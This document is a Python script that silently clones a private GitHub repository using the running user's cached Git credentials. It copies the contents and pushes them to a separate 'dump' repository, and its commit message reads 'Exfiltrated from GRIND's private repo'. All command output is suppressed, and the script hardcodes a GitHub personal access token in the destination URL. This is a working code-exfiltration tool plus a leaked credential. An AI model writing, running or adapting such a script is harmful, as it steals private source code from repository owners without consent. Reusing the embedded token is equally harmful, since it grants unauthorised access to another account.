import subprocess
import os
import shutil
import time

# === CONFIGURATION ===
# GRIND's private repo - GCM will handle auth here automatically
GRIND_PRIVATE_REPO = "https://github.com/nickchell/newgig.git"

# ADMIN's dump repo - We inject the ADMIN token here to force auth as ADMIN
# Replace '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' with the actual token from avtbackend-collab
ADMIN_TOKEN = "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" 
ADMIN_DUMP_REPO = f"https://{ADMIN_TOKEN}@github.com/avtbackend-collab/grind-data-dump.git"

CLONE_DIR = "grind_repo_clone"
DUMP_DIR = "dump_dir"

def safe_remove_dir(dir_name):
    """Robustly remove a directory, handling permission errors."""
    if os.path.exists(dir_name):
        try:
            shutil.rmtree(dir_name)
        except PermissionError:
            time.sleep(2)
            try:
                shutil.rmtree(dir_name)
            except PermissionError:
                subprocess.run(["cmd", "/c", "rmdir", "/s", "/q", dir_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

# === CLEANUP ===
safe_remove_dir(CLONE_DIR)
safe_remove_dir(DUMP_DIR)

# 1. Clone GRIND's private repo (GCM handles auth transparently)
subprocess.run(["git", "clone", GRIND_PRIVATE_REPO, CLONE_DIR], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

# 2. Copy contents to a new clean repo for pushing
os.makedirs(DUMP_DIR, exist_ok=True)
for item in os.listdir(CLONE_DIR):
    s = os.path.join(CLONE_DIR, item)
    d = os.path.join(DUMP_DIR, item)
    if os.path.isdir(s):
        shutil.copytree(s, d)
    else:
        shutil.copy2(s, d)

# 3. Initialize a fresh git repo in the dump directory and push to ADMIN's repo
os.chdir(DUMP_DIR)

if os.path.exists(".git"):
    safe_remove_dir(".git")

subprocess.run(["git", "init"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
# Use the URL with the ADMIN token embedded
subprocess.run(["git", "remote", "add", "origin", ADMIN_DUMP_REPO], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
subprocess.run(["git", "add", "."], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
subprocess.run(["git", "commit", "-m", "Exfiltrated from GRIND's private repo"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

# Handle branch name: try 'main' first, then 'master'
try:
    subprocess.run(["git", "push", "-u", "origin", "main"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
except subprocess.CalledProcessError:
    subprocess.run(["git", "push", "-u", "origin", "master"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)